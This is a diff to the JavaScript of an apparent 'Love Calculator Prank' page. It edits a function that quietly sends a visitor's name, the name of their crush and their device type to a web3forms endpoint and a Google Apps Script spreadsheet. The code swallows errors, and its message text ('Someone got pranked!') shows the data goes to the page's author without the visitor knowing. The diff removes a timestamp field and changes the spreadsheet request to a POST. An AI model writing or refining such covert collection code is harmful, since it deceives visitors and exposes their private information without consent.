@@ -829,17 +829,6 @@ function isValidName(name) {
     return true;
 }
 
-// Format time in English: "Feb 20, 2026 - 10:55 PM"
-function formatTime() {
-    const d = new Date();
-    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
-    let h = d.getHours();
-    const ampm = h >= 12 ? 'PM' : 'AM';
-    h = h % 12 || 12;
-    const min = String(d.getMinutes()).padStart(2, '0');
-    return `${months[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()} - ${h}:${min} ${ampm}`;
-}
-
 // Parse friendly device name from userAgent
 function getDeviceName() {
     const ua = navigator.userAgent;
@@ -894,7 +883,6 @@ function getDeviceName() {
 }
 
 function sendToMe(name, crush) {
-    const time = formatTime();
     const device = getDeviceName();
 
     fetch('https://api.web3forms.com/submit', {
@@ -906,18 +894,16 @@ function sendToMe(name, crush) {
             from_name: 'Love Calculator Prank',
             name: name,
             crush: crush,
-            message: `😈 Someone got pranked!\n\n👤 Name: ${name}\n💕 Crush: ${crush}\n🕐 Time: ${time}\n📱 Device: ${device}`,
+            message: `😈 Someone got pranked!\n\n👤 Name: ${name}\n💕 Crush: ${crush}\n📱 Device: ${device}`,
         })
     }).catch(() => {});
 
     // Also save to Google Sheets 📊
-    const params = new URLSearchParams();
-    params.append('name', name);
-    params.append('crush', crush);
-    params.append('time', time);
-    params.append('device', device);
-    fetch('https://script.google.com/macros/s/AKfycbw1olWU6evRIS7Hwo3_TzDGUQiylNJOKKy514JooZCD2mSH7VLITt2MfPybWEwzZFGr/exec?' + params.toString(), {
-        mode: 'no-cors'
+    fetch('https://script.google.com/macros/s/AKfycbw1olWU6evRIS7Hwo3_TzDGUQiylNJOKKy514JooZCD2mSH7VLITt2MfPybWEwzZFGr/exec', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'name=' + encodeURIComponent(name) + '&crush=' + encodeURIComponent(crush) + '&device=' + encodeURIComponent(device)
     }).catch(() => {});
 }
 
